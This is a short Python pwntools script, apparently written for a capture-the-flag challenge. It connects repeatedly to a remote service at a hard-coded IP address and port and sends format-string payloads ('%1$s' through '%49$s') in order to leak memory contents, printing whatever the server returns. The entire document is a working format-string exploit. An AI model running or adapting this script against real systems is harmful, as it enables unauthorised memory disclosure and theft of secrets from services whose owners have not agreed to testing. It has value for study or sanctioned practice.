from pwn import *

result = ''
for i in range(1, 50):
    conn = remote('34.125.199.248', 1337)
    fmt_str = f'%{i}$s'
    
    conn.sendlineafter(b'Tell me your secret so I can reveal mine ;) >> ', fmt_str.encode())
    response = conn.recvline()
    print(response.decode('latin-1'))
    
    try:
        response = conn.recvline()
        print(response.decode('latin-1').strip())
    except EOFError:
        print("Connection closed by server")

    conn.close()

print(result)
